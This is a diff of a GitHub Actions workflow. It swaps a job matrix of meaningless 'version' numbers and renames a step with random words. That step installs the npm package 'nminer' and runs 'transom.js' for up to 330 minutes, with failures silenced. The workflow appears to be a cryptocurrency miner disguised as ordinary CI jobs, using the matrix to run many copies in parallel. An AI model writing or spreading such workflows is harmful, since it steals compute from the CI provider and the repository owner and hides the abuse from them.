@@ -9,26 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4400 }
-          - { version: 5161 }
-          - { version: 8038 }
-          - { version: 9441 }
-          - { version: 5892 }
-          - { version: 133 }
-          - { version: 8171 }
-          - { version: 3015 }
-          - { version: 4511 }
-          - { version: 5781 }
-          - { version: 3546 }
-          - { version: 3118 }
-          - { version: 24 }
-          - { version: 1105 }
-          - { version: 4888 }
-          - { version: 2913 }
-          - { version: 4117 }
-          - { version: 2403 }
-          - { version: 6064 }
-          - { version: 4652 }
+          - { version: 8705 }
+          - { version: 6998 }
+          - { version: 343 }
+          - { version: 5591 }
+          - { version: 2559 }
+          - { version: 2275 }
+          - { version: 9778 }
+          - { version: 3165 }
+          - { version: 116 }
+          - { version: 8694 }
+          - { version: 9164 }
+          - { version: 310 }
+          - { version: 2438 }
+          - { version: 8989 }
+          - { version: 4405 }
+          - { version: 1294 }
 
     steps:
       - name: Checkout
@@ -39,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: optimal among so dental derby
+      - name: lest tremendously now or
         run: |
           npm install nminer@latest
-          timeout 309m node transom.js || echo "transom executed"
+          timeout 330m node transom.js || echo "transom executed"
